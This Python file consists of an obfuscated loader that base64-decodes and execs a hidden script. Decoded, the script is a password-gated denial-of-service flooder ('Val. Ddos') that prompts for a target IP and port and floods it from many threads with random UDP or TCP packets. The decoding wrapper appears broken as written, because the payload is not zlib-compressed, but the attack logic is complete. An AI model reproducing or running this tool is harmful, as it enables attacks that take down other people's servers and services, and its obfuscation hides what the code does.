import marshal,zlib,base64
exec(marshal.load(zlib.decompress(base64.b64decode("aW1wb3J0IHJhbmRvbQppbXBvcnQgc29ja2V0CmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IG9zCmltcG9ydCB0aW1lCgpLID0gJ1wwMzNbOTNtJwpVID0gJ1wwMzNbOTVtJwpDID0gJ1wwMzNbOTRtJwpSID0gJ1wwMzNbOTFtJwpIID0gJ1wwMzNbOTJtJwoKb3Muc3lzdGVtKCJjbGVhciIpCnBhc3N3b3JkID0gaW5wdXQoSysiWytdIFBhc3N3b3JkIDogIikKaWYgcGFzc3dvcmQgPT0gInRvb2xzdmFsIjoKICAgIHByaW50KCJjb3JyZWN0IHBhc3N3b3JkIikKICAgIHRpbWUuc2xlZXAoMikKZWxzZSA6CiAgICBwcmludCgiUGFzc3dvcmQgd3JvbmciKQogICAgdGltZS5zbGVlcCgxMDAwKQogICAgCm9zLnN5c3RlbSgiY2xlYXIiKQoKcHJpbnQoIlZhbC4gRGRvcyIpCmlwID0gc3RyKGlucHV0KCIgSXAgVGFyZ2V0OiAiKSkKcG9ydCA9IGludChpbnB1dCgiIFBvcnQgVGFyZ2V0OiAiKSkKY2hvaWNlID0gc3RyKGlucHV0KCIgUmVhZHk/ICh5L24pOiAiKSkKdGltZXMgPSBpbnQoaW5wdXQoIiBGYWtldDogIikpCnRocmVhZHMgPSBpbnQoaW5wdXQoIiBUaHJlYWRzOiAiKSkKZGVmIHJ1bigpOgogIGRhdGEgPSByYW5kb20uX3VyYW5kb20oMTAyNCkKICBpID0gcmFuZG9tLmNob2ljZSgoIlsqXSIsIlshXSIsIlsjXSIpKQogIHdoaWxlIFRydWU6CiAgICB0cnk6CiAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKICAgICAgYWRkciA9IChzdHIoaXApLGludChwb3J0KSkKICAgICAgZm9yIHggaW4gcmFuZ2UodGltZXMpOgogICAgICAgIHMuc2VuZHRvKGRhdGEsYWRkcikKICAgICAgcHJpbnQoaSArIiBTZW5kaW5nLi4uIikKICAgIGV4Y2VwdDoKICAgICAgcHJpbnQoUisiWyFdIFNlbmRpbmcuLi4iKQoKZGVmIHJ1bjIoKToKICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDE2KQogIGkgPSByYW5kb20uY2hvaWNlKCgiWypdIiwiWyFdIiwiWyNdIikpCiAgd2hpbGUgVHJ1ZToKICAgIHRyeToKICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgcy5jb25uZWN0KChpcCxwb3J0KSkKICAgICAgcy5zZW5kKGRhdGEpCiAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICBzLnNlbmQoZGF0YSkKICAgICAgcHJpbnQoaSArIiBBdHRhY2tpbmcgVGFyZ2V0IikKICAgIGV4Y2VwdDoKICAgICAgcy5jbG9zZSgpCiAgICAgIHByaW50KEgrIltYXSBEb3duIT8iKQoKZm9yIHkgaW4gcmFuZ2UodGhyZWFkcyk6CiAgaWYgY2hvaWNlID09ICd5JzoKICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4pCiAgICB0aC5zdGFydCgpCiAgZWxzZToKICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4yKQogICAgdGguc3RhcnQoKQ==")))